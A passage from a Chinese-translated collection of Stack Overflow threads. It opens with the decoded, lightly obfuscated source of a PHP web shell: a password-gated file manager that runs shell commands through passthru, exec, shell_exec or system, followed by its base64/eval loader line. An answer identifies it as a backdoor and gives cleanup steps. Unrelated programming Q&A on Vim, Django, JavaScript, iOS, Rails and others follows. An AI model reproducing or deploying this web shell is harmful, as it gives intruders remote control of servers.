   pr4nt "<td 4d=f><1 hr5f=\"?p=r5n1m5&f4l5=".r51lp1th($f4l5)."&d4r=".r51lp1th('.')."\">[R]</1><1 hr5f=\"?p=d5l5t5&f4l5=".r51lp1th($f4l5)."\">[D]</1></td><td 4d=f><1 hr5f=\"".$m5."?p=5d4t&d4r=".r51lp1th('.')."&f4l5=".r51lp1th($f4l5)."\">".$f4l5."</1></td><td 4d=f>".f4l5s4z5($f4l5)."</td><td 4d=f><1 hr5f=\"?p=chm2d&d4r=".r51lp1th('.')."&f4l5=".r51lp1th($f4l5)."\"><f2nt c2l2r=".g5t_c2l2r($f4l5).">".p5rm($f4l5)."</f2nt></1></td><td 4d=f>".d1t5 ("Y/m/d, H:4:s", f4l5mt4m5($f4l5))."</td><tr>";
  }
 }
 5ls5
 {
  pr4nt "<3>Err2r!</3> C1n't 2p5n <b>".r51lp1th('.')."</b>!<br>";
 }

 pr4nt "</t1bl5><hr><t1bl5 b2rd5r=0 w4dth=600%><td><b>Upl21d f4l5</b><br><f2rm 5nctyp5=\"m3lt4p1rt/f2rm-d1t1\" 1ct42n=\"".$m5."?d4r=".r51lp1th('.')."\" m5th2d=\"POST\">
<4np3t typ5=\"h4dd5n\" n1m5=\"MAX_FILE_SIZE\" v1l35=\"600000000\" /><4np3t s4z5=o0 n1m5=\"3pl21d5df4l5\" typ5=\"f4l5\" />
<4np3t typ5=\"s3bm4t\" v1l35=\"Upl21d F4l5\" />
</f2rm></td><td><f2rm 1ct42n=\"".$m5."\" m5th2d=GET><b>Ch1ng5 D4r5ct2ry<br></b><4np3t typ5=t5xt s4z5=u0 n1m5=d4r v1l35=\"".r51lp1th('.')."\"><4np3t typ5=s3bm4t v1l35=\"Ch1ng5 D4r5ct2ry\"></f2rm></td>
<tr><td><f2rm 1ct42n=\"".$m5."\" m5th2d=GET><b>Cr51t5 f4l5<br></b><4np3t typ5=h4dd5n n1m5=d4r v1l35=\"".r51lp1th('.')."\"><4np3t typ5=t5xt s4z5=u0 n1m5=f4l5 v1l35=\"".r51lp1th('.')."\"><4np3t typ5=h4dd5n n1m5=p v1l35=5d4t><4np3t typ5=s3bm4t v1l35=\"Cr51t5 f4l5\"></f2rm>
</td><td><f2rm 1ct42n=\"".$m5."\" m5th2d=GET><b>Cr51t5 d4r5ct2ry<br></b><4np3t typ5=t5xt s4z5=u0 n1m5=crd4r v1l35=\"".r51lp1th('.')."\"><4np3t typ5=h4dd5n n1m5=d4r v1l35=\"".r51lp1th('.')."\"><4np3t typ5=h4dd5n n1m5=p v1l35=cr51t5d4r><4np3t typ5=s3bm4t v1l35=\"Cr51t5 d4r5ct2ry\"></f2rm></td>
</t1bl5>";

}

f3nct42n l2g4n()
{
 pr4nt "<t1bl5 b2rd5r=0 w4dth=600% h54ght=600%><td v1l4gn=\"m4ddl5\"><c5nt5r>
 <f2rm 1ct42n=".b1s5n1m5(__FILE__)." m5th2d=\"POST\"><b>P1ssw2rd?</b>
 <4np3t typ5=\"p1ssw2rd\" m1xl5ngth=\"oa\" n1m5=\"p1ss\"><4np3t typ5=\"s3bm4t\" v1l35=\"L2g4n\">
 </f2rm>";
}
f3nct42n r5l21d()
{
 h51d5r("L2c1t42n: ".b1s5n1m5(__FILE__));
}
f3nct42n g5t_5x5c3t42n_m5th2d()
{
 4f(f3nct42n_5x4sts('p1ssthr3')){ $m = "p1ssthr3"; }
 4f(f3nct42n_5x4sts('5x5c')){ $m = "5x5c"; }
 4f(f3nct42n_5x4sts('sh5ll_5x5c')){ $m = "sh5ll_ 5x5c"; }
 4f(f3nct42n_5x4sts('syst5m')){ $m = "syst5m"; }
 4f(!4ss5t($m)) //N2 m5th2d f23nd :-|
 {
  $m = "D4s1bl5d";
 }
 r5t3rn($m);
}
f3nct42n 5x5c3t5_c2mm1nd($m5th2d,$c2mm1nd)
{
 4f($m5th2d == "p1ssthr3")
 {
  p1ssthr3($c2mm1nd);
 }

 5ls54f($m5th2d == "5x5c")
 {
  5x5c($c2mm1nd,$r5s3lt);
  f2r51ch($r5s3lt 1s $23tp3t)
  {
   pr4nt $23tp3t."<br>";
  }
 }

 5ls54f($m5th2d == "sh5ll_5x5c")
 {
  pr4nt sh5ll_5x5c($c2mm1nd);
 }

 5ls54f($m5th2d == "syst5m")
 {
  syst5m($c2mm1nd);
 }
}
f3nct42n p5rm($f4l5)
{
 4f(f4l5_5x4sts($f4l5))
 {
  r5t3rn s3bstr(spr4ntf('%2', f4l5p5rms($f4l5)), -u);
 }
 5ls5
 {
  r5t3rn "????";
 }
}
f3nct42n g5t_c2l2r($f4l5)
{
4f(4s_wr4t1bl5($f4l5)) { r5t3rn "gr55n";}
4f(!4s_wr4t1bl5($f4l5) && 4s_r51d1bl5($f4l5)) { r5t3rn "wh4t5";}
4f(!4s_wr4t1bl5($f4l5) && !4s_r51d1bl5($f4l5)) { r5t3rn "r5d";}

}
f3nct42n sh2w_d4rs($wh5r5)
{
 4f(5r5g("^c:",r51lp1th($wh5r5)))
 {
 $d4rp1rts = 5xpl2d5('\\',r51lp1th($wh5r5));
 }
 5ls5
 {
 $d4rp1rts = 5xpl2d5('/',r51lp1th($wh5r5));
 }

 $4 = 0;
 $t2t1l = "";

 f2r51ch($d4rp1rts 1s $p1rt)
 {
  $p = 0;
  $pr5 = "";
  wh4l5($p != $4)
  {
   $pr5 .= $d4rp1rts[$p]."/";
   $p++;

  }
  $t2t1l .= "<1 hr5f=\"".b1s5n1m5(__FILE__)."?d4r=".$pr5.$p1rt."\">".$p1rt."</1>/";
  $4++;
 }

 r5t3rn "<ha>".$t2t1l."</ha><br>";
}
pr4nt $f22t5r;
// Ex4t: m1yb5 w5'r5 4ncl3d5d s2m5wh5r5 1nd w5 d2n't w1nt th5 2th5r c2d5 t2 m5ss w4th 23rs :-)
5x4t();
?>
 zِ¥m«ë‡^r‡^$_X=base64_decode($_X);$_X=strtr($_X,'123456aouie','aouie123456');$_R=ereg_replace('__FILE__',"'".$_F."'",$_X);eval($_R);$_R=0;$_X=0; 
```

来源：[http ://www.base64decode.org/](http://www.base64decode.org/)

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-01-15T06:35:53.670

如果您通过替换发布代码最底部的密码来进一步解码字符串，您将获得实际代码，尽管从上面可以很容易地确定发生了什么。

这是*讨厌的*代码。

**尽快删除该文件，因为它是您网站的后门 **并且经过简单检查，还可能提供破解密码的机制（可能还会做很多其他令人讨厌的事情）。

立即删除文件后，我能提供的唯一建议是：

1.  将您的 root 密码更改为强密码（随机且 >20 个字符）。
2.  更改运行 Web 服务器的任何管理员帐户的密码
3.  更改托管在您的 web/ftp 服务器上的任何 ftp 站点的密码
4.  更改在您的网络服务器上运行的应用程序的密码（例如 Wordpress）
5.  在上面第 4 点中更改您的 Web 应用程序使用的任何底层数据库的密码
6.  对具有字符串“base64_decode”的任何文件执行“在文件中查找”。任何具有此字符串的文件都是**高度可疑**的。如果您无法解释该文件在那里的作用，则强烈建议将其隔离。这些文件中往往几乎没有可读代码，因为它们的创建者不希望您知道其中隐藏的内容。有些文件确实合法地使用 base64 字符串。

完成此操作后，在您的 Web 目录中搜索新的或最近创建/更新的文件。此代码很可能被用于在您的网站中植入某些内容，例如网络钓鱼代码。对您的托管站点和基础数据库进行完整备份。删除或隔离任何看起来可疑的东西。

所有密码都应该是随机的和强密码。使用密码生成器。将这个文件放在这里的人很有可能是因为一开始的密码很弱（你永远不会知道）而进入你的网站。

我试图显示有问题的代码，但由于格式不正确（对不起），stackoverflow 不允许我显示。

# ajax - django动态ajax表单

> ID：11735550
> 
> 赞同：0
> 
> 时间：2012-07-31T07:54:22.800
> 
> 标签：ajax, django, django-forms, django-formwizard

我正在尝试为我的项目编写可用于任何模型的 csv 导入器，它应该是一个向导，首先您上传 csv 文件，在第二步中，它会生成一个基于 csv 文件的表单，用于映射 csv 字段数据库字段，在第一次调用表单时，我应该指定映射的模型，这可以是第一个表单中的隐藏输入。另一方面，我想在所有过程中使用 ajax，我不知道到底要使用什么，所以它将是一个完整的可重用模块，并且编写更少的 java 脚本，我应该如何生成第二个动态表单。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T08:10:46.390

通过ajax提交第一个表单。该请求将包含（隐藏）要使用的表单，因此只需呈现该表单（基于 ModelForm）。为每个可能的表单（模型）制作一个模板并相应地返回渲染的模板。ajax 调用将在成功时删除第一种形式并将其替换为响应（这将是第二种形式）。

# vim - Vim 中每行末尾的美元符号 ("$") 是什么

> ID：11735560
> 
> 赞同：22
> 
> 时间：2012-07-31T07:55:08.947
> 
> 标签：vim

我对 Vim 比较陌生。每当我使用 启动 Vim`vim LearnRuby.rb`时，每行都会出现一个美元符号。

为什么？

* * *

## 回答 #1

> 赞同：37
> 
> 时间：2012-07-31T08:06:56.903

```
:set nolist 
```

将关闭当前缓冲区的特殊字符，例如显示为的制表符和显示为`^I`的行尾字符`$`。

但是，如果它在您运行时始终如一地这样做`vim`，您需要查看您的`.vimrc`（或其他适用的启动文件）并找出`set list`导致它的原因。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-31T08:07:10.863

打开`~/.vimrc`并检查它的内容
如果你看到这样的一行：

```
set list 
```

这意味着，它将显示`$`在每一行中以标记行尾。
删除它或`:set nolist`在 vi 编辑器中使用命令。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2022-02-16T19:06:28.767

显然，解决方案不是`:set nolist`，因为这也会禁用其他字符，如制表符和尾随空格，这非常有用。:set nolist 如果您希望所有特殊字符都消失，那将是正确的答案。

如果您只想快速修复，可以将其添加到您的 vimrc 中：

`set listchars+=eol:\` .

那是一个反斜杠，后跟一个空格。

或者，您可以设置 listchars 的所有参数，例如`set listchars=tab:>\ ,trail:.`，不包括 eol 参数，该参数确定用于行尾的字符。

参考`:h listhcars`和`:h list`

# winforms - 在列表中选择朋友时，如何实现 Skype 中使用的这种蓝色背景？

> ID：11735566
> 
> 赞同：1
> 
> 时间：2012-07-31T07:55:31.040
> 
> 标签：winforms, colors, skype

我想这是使用的渐变之王，但我不知道。我想在我的 WinForms 应用程序中使用它。

![在此处输入图像描述](../Images/afc205abbc0dfba8bf8107ca722b6d0b.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T15:06:21.213

执行此类操作的最简单方法是使用 Paint.Net 之类的程序来获取绘图中使用的颜色的 RGB 值。

以面板为例：

```
void panel1_Paint(object sender, PaintEventArgs e) {
  e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;

  using (LinearGradientBrush br = new LinearGradientBrush(
                                  panel1.ClientRectangle,
                                  Color.FromArgb(52, 151, 254),
                                  Color.FromArgb(61, 129, 243),
                                  LinearGradientMode.Vertical)) {
    e.Graphics.FillRectangle(br, panel1.ClientRectangle);
  }

  using (Pen p = new Pen(Color.FromArgb(37, 110, 184), 2)) {
    e.Graphics.DrawRectangle(p, 0, 0,
                             panel1.ClientSize.Width - 1,
                             panel1.ClientSize.Height - 1);
  }
} 
```

结果是：

![在此处输入图像描述](../Images/631caf0cd161e5f7512f32ee18853740.png)

非常接近原著。您可以通过使使用的颜色变亮或变暗来进行调整。

# python - 是否可以自动验证telnet？

> ID：11735568
> 
> 赞同：2
> 
> 时间：2012-07-31T07:55:46.090
> 
> 标签：python, telnet, telnetlib

使用[telnetlib](http://docs.python.org/library/telnetlib.html)时，我注意到一些有趣的变量：

```
AUTHENTICATION = chr(37) # Authenticate
XAUTH = chr(41) # XAUTH
PRAGMA_LOGON = chr(138) # TELOPT PRAGMA LOGON
SSPI_LOGON = chr(139) # TELOPT SSPI LOGON 
```

此外，[此页面](http://pcmicro.com/netfoss/telnet.html)列出了一些详细描述`AUTHENTICATION`选项的 RFC。

如果我理解正确，如果 telnet 服务器支持身份验证，我应该`IAC DO AUTHENTICATION`在连接到它时收到。但是，当尝试在 Linux 机器上连接到*telnetd*时，我没有收到此选项，因此无法发送`IAC WILL AUTHENTICATION`.

我的理解正确吗？有没有办法让服务器执行身份验证？甚至可以自动验证 telnet 会话吗？（不听“登录：”、“用户名：”、“密码：”等类似提示）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:31:56.363

是的，您正确理解[RFC 1416](http://www.ietf.org/rfc/rfc1416.txt)。`DO`如果服务器支持身份验证，则服务器应首先发送。您可以尝试发送`WILL`，但这将违反规范，并且可能无论如何都无法正常工作。

通过 Linux telnetd，您可能指的是 netkit telnetd。据我在其手册页上看到的：

> *-a authmode* 此选项可用于指定应使用哪种模式进行身份验证。请注意，此选项仅在 telnetd 已编译支持身份验证时才有用，**当前版本中不提供此功能**。[...]

所以我只想说它不能那样做。我正在使用 OpenBSD telnetd（`telnet-bsd`Gentoo 中的软件包）；它似乎有一些身份验证位，但我根本无法让它工作。我怀疑它只支持基于 Kerberos 的身份验证。

查看[RFC 2941](http://www.ietf.org/rfc/rfc2941.txt)中的身份验证类型列表，似乎大多数身份验证类型甚至都没有指定。看看那些，DSS/DSA 最有趣（它也用于 SSH），但我想很难找到兼容的服务器*和*客户端。可悲的是，那里似乎没有关于简单（明文）身份验证的建议。

所以，总结一下：是的，如果*有人*实现它是可能的。但是由于 telnet 实际上已经死了，我怀疑你会找到服务器实现。即使你这样做了，你也必须自己编写客户端，这对于支持的方案来说并不容易。所以我怀疑这是否值得。

# algorithm - Levenshtein algorithm - fail-fast if edit distance is bigger than a given threshold

> ID：11735576
> 
> 赞同：4
> 
> 时间：2012-07-31T07:56:32.803
> 
> 标签：algorithm, delphi, levenshtein-distance

For the Levenshtein algorithm I have found [this implementation for Delphi](https://stackoverflow.com/questions/10580241/how-can-i-compute-a-difference-between-two-strings/10593797#10593797).

I need a version which stops as soon as a maximum distance is hit, and return the distance found so far.

My first idea is to check the current result after every iteration:

```
for i := 1 to n do
    for j := 1 to m do
    begin
      d[i, j] := Min(Min(d[i-1, j]+1, d[i,j-1]+1), d[i-1,j-1]+Integer(s[i] <> t[j]));

      // check   
      Result := d[n, m];
      if Result > max then
      begin
        Exit;
      end; 

    end; 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-31T10:05:58.500

我收集你想要的是找到莱文斯坦距离，如果它在下面`MAX`，对吧？

如果是这样，达到一个大于的值`MAX`是不够的，因为它只意味着*某个*路径比那个更长，而不是不存在更短的路径。为了确保没有比`MAX`可以找到的路径更短的路径，必须监视到当前点的路径的最小可能长度，即距离表中一列的最小值。

我不擅长 Delphi，但我认为代码应该是这样的：

```
for i := 1 to n do
begin;
    min := MAX + 1
    for j := 1 to m do
    begin;
      d[i, j] := Min(Min(d[i-1, j]+1, d[i,j-1]+1), d[i-1,j-1]+Integer(s[i] <> t[j]));
      min := Min(min, d[i,j])
    end;
    if min >= MAX then
        Exit;
end; 
```

# android - Kindle Fire Game Circle CANNOT_BIND error

> ID：11735583
> 
> 赞同：1
> 
> 时间：2012-07-31T07:57:15.860
> 
> 标签：android, kindle-fire

Has anyone tried implementing Amazon's GameCircle into their Kindle Fire app?

I can't get it pass the initialization stage:

```
EnumSet<AmazonGamesFeature> myGameFeatures = EnumSet.of(AmazonGamesFeature.Leaderboards); 
```

onCreate:

```
AmazonGamesClient.initialize(getApplication(), new AmazonGamesCallback() 
{ 
@Override 
public void onServiceReady() 
{ 
} 

@Override 
public void onServiceNotReady(AmazonGamesStatus reason) 
{ 
switch (reason)
{ 
   case CANNOT_BIND: 
      Log.d(Globals.sApplicationName, "onCreate: CANNOT_BIND");
      break;
   case CANNOT_AUTHORIZE: 
      Log.d(Globals.sApplicationName, "onCreate: CANNOT_AUTHORIZE");
      break;
   case NOT_AUTHORIZED: 
      Log.d(Globals.sApplicationName, "onCreate: NOT_AUTHORIZED");
      break;
   case NOT_AUTHENTICATED: 
      Log.d(Globals.sApplicationName, "onCreate: NOT_AUTHENTICATED");
      break;
} 

} 

}, myGameFeatures); 
```

I get these errors when running the game:

```
07-31 15:45:39.609: E/AGC_ServiceProxy(970): Amazon Games Service is not available
07-31 15:45:39.609: D/AGC_ServiceProxy(970): Changing Status from:INITIALIZING to: CANNOT_BIND
07-31 15:45:39.619: E/GC_AmazonGamesClient(970): Failed to enable softkey button: android.content.pm.PackageManager$NameNotFoundException: com.amazon.ags.app 
```

Any help will be appreciated. Thank you.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-15T03:33:59.743

没有为我在模拟器上工作。在 Kindle Fire 设备上工作就像魅力一样。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-07T20:10:03.143

您需要将二进制文件“列入白名单”。进入亚马逊应用商店开发者控制台并进入游戏本身的未发布版本，然后进入“GameCircle”部分并点击“Whitelist Registery”。然后单击“将二进制文件列入白名单”按钮。

输入游戏的包名称，并从命令提示符（对于 Windows）运行此命令以获取密钥哈希：

```
keytool -exportcert -storepass android -alias androiddebugkey -keystore %USERPROFILE%\.android\debug.keystore | openssl sha1 -binary | openssl base64 
```

这应该会为您提供一个简短的 base 64 散列，用于对游戏的调试版本进行签名。您必须为发布版本做类似的事情，因为它使用不同的密钥签名。

**编辑**

除上述内容外，还要确保您的 Kindle Fire 已注册到实际的 Amazon 帐户，并且它至少具有 6.3.1 版的系统软件。我们有一个未注册的 Fire，因此从未获得包含 GameCircle 的软件升级。我也相信 GameCircle 需要您登录亚马逊帐户才能工作。

# objective-c - iOS：结合 SAX 和 DOM 解析

> ID：11735590
> 
> 赞同：2
> 
> 时间：2012-07-31T07:57:40.260
> 
> 标签：objective-c, dom, xml-parsing, sax, tbxml

我目前正在处理一个 iPad 项目，我需要将大型 XML 文件处理到 SQLite 后端。我目前正在使用[TBXML](http://tbxml.co.uk/TBXML/TBXML_Free.html)解析器进行这项工作。

所以所有的逻辑都已经到位，并且通常 TBXML 解析器完成了它需要做的工作。我现在遇到的唯一问题是 XML 文件变得太大并且内存不足。因此，我考虑切换到 SAX 解析器，例如 Alan Quatermain 的[AQXMLParser](http://quatermain.tumblr.com/post/93651539/aqxmlparser-big-memory-win)之类的核心 NSXMLParser 。然而，这将要求我重做我当前的所有逻辑，这些逻辑在某种程度上依赖于 DOM 树提供的功能。这是我宁愿不做的事情。

所以我想要尝试并做的是创建一种混合方法。鉴于我的 XML 结构，这应该是可能的。它基本上是一些重复的“记录”元素。在每条记录中都有可以重复和嵌套的各种元素。在我目前的方法中，我解析文档并将每个记录元素传递给将其处理到数据库中的函数。鉴于这已经存在，我想在我的混合解析方法中使用它。

这就是我想要实现的。我使用 SAX 解析器遍历我的文档。在遍历文档时，我构建了一个 Record 元素。每当我完成一个记录元素时，我都会将它传递给使用 TBXML 处理它的现有函数。然后 SAX 解析器继续构建下一个记录元素。主要目标是： - 修复内存占用（它不需要尽可能小，但它必须保持不变或至少比使用 TBXML 更小） - 保持性能可接受。

目前想实现这个如下：

```
- (void)parser:(NSXMLParser *)parser didStartElement:(NSString *)elementName namespaceURI:(NSString *)namespaceURI qualifiedName:(NSString *)qualifiedName attributes:(NSDictionary *)attributeDict{
    //Recreate record string each time record element is encountered
    if([elementName isEqualToString:@"Record"]) record = [[NSMutableString alloc] init];
    //Write XML tag with name
    [record appendFormat@"<%@>, elementName];
}

- (void)parser:(NSXMLParser *)parser foundCharacters:(NSString *)string{
    //Write XML content
    [record appendString:string];
}

- (void)parser:(NSXMLParser *)parser didEndElement:(NSString *)elementName namespaceURI:(NSString *)namespaceURI qualifiedName:(NSString *)qName{
    //Write XML tag
    [record appendFormat@"</%@>, elementName];
    if([elementName isEqualToString:@"Record"]){
        //Parse record string into TBXML object
        TBXML * tbxmlRecord = [TBXML tbxmlWithXMLString:record];
        //Send it to the TBXML record processor
        [self processElement:tbxmlRecord.rootXMLElement];
    }
} 
```

我认为这应该可行，但使用字符串感觉很脏。此外，当解析器到达新的记录元素时，我担心记录字符串是否不会很快被覆盖。

所以我的问题是，如果这是解决这个问题的合理方法，或者是否有更好的方法让我实现我正在寻找的东西？

**编辑：** 我已经实现了这种方法，它看起来工作得很好。我遇到的唯一问题是，如果我的源文件不是 UTF-8 编码的，我只会得到部分结果。但是当我纠正这一切时，一切顺利。内存使用并没有那么好。但也许它会尽其所能。需要进行更多测试...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:04:48.057

一般来说，你的方法对我来说听起来不错。如果您的解决方案在没有性能问题的情况下为您工作，那么我不会太担心字符串处理。如果你愿意，你可以分析你的应用程序，看看这浪费了多少 CPU 时间。

如果您想做一些更优化的事情，您可以尝试找到一个 SAX 解析器，它可以为您提供原始缓冲区的字节偏移量，并将其与一个 DOM 解析器相结合，让您可以使用非空终止的 C 字符串。我相信这意味着您必须切换到 C 或 C++ 库。我已经将[rapidxml](http://rapidxml.sourceforge.net)用于与您正在尝试的东西模糊相似的东西（嵌入在大文件中的 xml 块）。

# jquery - 使用carrierwave gem和jQuery-File-Upload库的多个文件选择引发Rails中的服务器内部错误

> ID：11735599
> 
> 赞同：0
> 
> 时间：2012-07-31T07:58:30.137
> 
> 标签：jquery, ruby-on-rails-3.2, carrierwave

我在一个 Rails 项目中工作，该项目有一个上传器作为它的组件之一。

我正在使用carrierwave gems 和jQuery-File-Upload 库来获取一些ajax！

当我添加了一项功能，那就是多选

```
<%= f.file_field :path, multiple: "multiple" %> 
```

该应用程序停止上传和提升`server internal error`

当我使用 firebug 控制台时，错误出现在该行

```
xhr.send( ( s.hasContent && s.data ) || null ); 
```

没有那个`multiple`属性，它工作得很好！像这样

```
<%= f.file_field :path %> 
```

我无法想象这个错误在哪里！

我试图修改名为[Fily](https://github.com/banditj/fily/tree/no-asset-pipeline)的工作rails示例以上传多个，但它也失败了！

这是我的模型、控制器和视图，因为我在这里粘贴了一些问题！ [http://pastebin.com/e2TPpsE9](http://pastebin.com/e2TPpsE9)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T05:19:04.037

我解决了:)

多个属性在类名中添加 [] 使其像这样

```
<input id="picture_path" type="file" name="picture[path][]" multiple="multiple"> 
```

因此，在控制器中将其修改为

```
@picture = Picture.new
@picture.avatar = params[:picture][:path][0] 
```

# ios - popViewController 到使用 UIStoryboardSegue 初始化的 UIViewController

> ID：11735600
> 
> 赞同：0
> 
> 时间：2012-07-31T07:58:32.510
> 
> 标签：ios, viewdidload, uistoryboardsegue, popviewcontroller, viewdidunload

我有一个列表控制器，它触发一个`performSegueWithIdentifier`加载所选项目的 detailViewController。为了初始化 detailViewController，我在它上面设置了一个属性，在`prepareForSegue`detailView 显示之前调用它。这一切都很好。

但是...
从详细视图中，我导航到执行一些内存密集型操作的控制器，并且我的 detailViewController 最终被卸载`viewDidUnload`并被调用。

现在用户按下标题栏中的后退按钮导致`popViewController`触发。当我`viewDidLoad`的 detailViewController 方法再次执行时，我没有机会在显示之前设置适当的属性。所以此时我的控件都没有显示正确/任何信息。

一旦它被释放并且用户导航回它，重新初始化我的 detailViewController 上的属性的最佳方法是什么？我曾想过在我的 AppDelegate 上设置“selectedItem”以在这种情况下使用，但这似乎是一个 hack。

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T05:26:35.140

我误解了 viewDidUnload 的场景并释放了我稍后重建视图所需的项目。再次感谢戈登。

# javascript - Javascript函数每次调用循环

> ID：11735607
> 
> 赞同：0
> 
> 时间：2012-07-31T07:58:55.237
> 
> 标签：javascript, jquery, loops

我有一个函数叫做`rotator(id)`：这个函数动画`div`，我可以用不同的方式调用这个函数`id`来动画不同的元素

实际上我使用了 5 个不同的 id ，`1,2,3,4,5`

对于通话，我需要 put ：

```
rotador(1);rotador(2);rotador(3);rotador(4);rotador(5); 
```

问题是我想在自动模式下旋转。为此，我认为使用这个

```
for (i=0;i<=5;i++) { 
   setTimeout(rotador(i),2000);
} 
```

但它不起作用，因为它同时进行动画处理，不要让 firt 执行第一个并在 first go second 等之前继续，等等，当 go 结束或数字 5 开始其他时间时

我的问题就是这个，如果你能帮助我谢谢！：） 问候

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-31T08:03:58.343

您实际上是在调用 rodator(i) 函数，并安排在 2 秒后执行 rodator 的结果。换句话说，您的代码现在等于：

```
for (i=0;i<=5;i++) { 
   var result = rotador(i);
   setTimeout(result,2000);
} 
```

您可以通过为回调创建一个函数来完成此操作：

```
for (i=0;i<=5;i++) { 
   setTimeout((function(i){
      return function(){
        rotador(i);
      }
    })(i),2000 * i);
} 
```

或者您可以在 rotador 函数本身中调用下一个 rodator：

```
var rotador = function(i){
    // your code
    if (i < 5) {
       setTimeout(function(){rotaror(i + 1);}, 2000);
    }
} 
```

**注意**：需要第二个示例中的闭包来调用具有正确值的函数`i`。我们正在创建一个匿名函数，并创建`i`为局部范围变量，其值不会因外部范围更改而改变。（如果这样更易读，我们可以在本地范围内重命名`i`为）。`n`否则，`i`每次调用 rotador 时 的值都会是 5，因为 的值`i`会在实际函数调用之前被修改。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-31T08:03:02.037

由于 setTimeout() 在继续之前不会等待函数执行，因此您必须为不同的项目将延迟设置为不同的值，`2000 * (i + 1)`而不是仅仅`2000`

编辑：是的，你需要 Darhazer 建议的回调

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-31T08:07:31.087

```
rotationStep(1);

function rotador(id)
{
    console.log(id);
}

function rotationStep( currentId )
{
    rotador(currentId);
    var nextId = currentId<5 ? currentId+1 : 1;
    setTimeout(function(){ rotationStep(nextId) },2000); //anonymous function is a way to pass parameter in IE
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-31T08:02:04.550

使用回调：

```
setTimeout(function() {
    rotador(i)
}, 2000) 
```

# php - 如何为目录产品视图设置模板？

> ID：11735609
> 
> 赞同：1
> 
> 时间：2012-07-31T07:58:57.000
> 
> 标签：php, magento, overriding

我正在覆盖目录产品视图页面。我必须设置自己的模板文件，而不是`view.phtml`.

```
<catalog>       
    <rewrite>      
        <product_view>
            COM_MODULE_Block_Catalog_Product_View
        </product_view>
    </rewrite>
</catalog> 
```

那么我该怎么做呢？有什么建议么？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T09:09:19.893

编辑您的 config.xml 文件

```
<blocks>
  <catalog>
     <rewrite>
       <product_view>yournamespace_modulename_block_View</product_view>
     </rewrite>
  </catalog>
</blocks> 
```

并在 namespace/Module/Block/View.php 中创建 View.php 文件

```
class Namespace_ModuleName_Block_View extends Mage_Catalog_Block_Product_View
{
  // Your Functions 
} 
```

# c# - 如何更改先前选择的下拉列表的索引？

> ID：11735610
> 
> 赞同：0
> 
> 时间：2012-07-31T07:58:59.367
> 
> 标签：c#, gridview, indexing

我在每一行都有带有下拉列表模板字段的gridview。当我从下拉列表中选择任何值时，它会改变下面第三行的颜色。但是当我点击另一个下拉列表时，它会改变下面第三行的颜色，但是上一个下拉列表的索引未更改为 0，即“选择”。它仍然显示在最后一个下拉列表中选择的值。我只想在单击下拉列表时，所有其他下拉列表都应索引为 0，即“选择”，除了一个我点击了。我在下拉列表的 Selectedindexchange 事件中执行以下操作：

```
protected void GridView1_SelectedIndexChanged(object sender,EventArgs e)
    {

        foreach (GridViewRow gvRow in GridView1.Rows)
        {
               int g1 = gvRow.RowIndex;
               GridView1.Rows[g1].BackColor = Color.White;
         }
            DropDownList ddl = (DropDownList)sender;
            GridViewRow row = (GridViewRow)ddl.NamingContainer;
            int g = row.RowIndex + 3;
            int current_row_index = row.RowIndex;
            int pp = GridView1.Rows.Count;
             GridView1.Rows[g].BackColor = Color.Red;
         }
     } 
```

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T08:05:57.263

只需将**DropdownName.ClearSelection()**用于其他每个下拉列表，除了您调用 Selectedindexchange 事件的下拉列表。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T08:09:18.373

也许是这样的：

```
 protected void GridView1_SelectedIndexChanged(object sender,EventArgs e)
    {
        DropDownList ddl = (DropDownList)sender;
        GridViewRow row = (GridViewRow)ddl.NamingContainer;
        int g = row.RowIndex + 3;
        int current_row_index = row.RowIndex;

        foreach (GridViewRow gvRow in GridView1.Rows)
        {
            gvRow.BackColor = Color.White;

            if (gvRow.FindControl("nameOfTheDropdown") != null && gvRow.RowIndex != current_row_index)
            {
                ((DropDownList)gvRow.FindControl("nameOfTheDropdown")).SelectedIndex = 0;
            }
        }

        GridView1.Rows[g].BackColor = Color.Red;  
     } 
```

问候

# javascript - 淡入选定的 div 并将其设置在其他 div 之上

> ID：11735613
> 
> 赞同：3
> 
> 时间：2012-07-31T07:59:27.223
> 
> 标签：javascript, html, css

我需要创建一个菜单，其中 div 彼此重叠，当单击 div 时，我希望它位于其他菜单之上。

[与此](http://jsfiddle.net/ChinmayeeG/f9j9a/)非常相似的东西，但是当单击时，我希望它淡入其他 div 的顶部。

有任何想法吗？

谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-31T08:07:20.197

可能是这样的。可能需要调整以适应。

[演示](http://jsfiddle.net/f9j9a/118/)

```
$("div").click(function(){
    $("div").css("zIndex",1);
    $(this).fadeOut('slow', function() {
        $(this).css("zIndex",100);
        $(this).fadeIn('slow');
    });
});​ 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-31T08:04:43.817

用户是否可以在不透明度位于顶部时对其进行动画处理：http: [//jsfiddle.net/bingjie2680/f9j9a/120/](http://jsfiddle.net/bingjie2680/f9j9a/120/)

```
$("div").click(function(){
    $("div").css("zIndex",1);
    $(this).css({"zIndex":100, 'opacity':0.4}).animate({'opacity':1}, 1000);
});​ 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-31T08:02:56.657

由于事件委托，这将起作用并且还支持动态添加和删除框（与其他答案相反）：

```
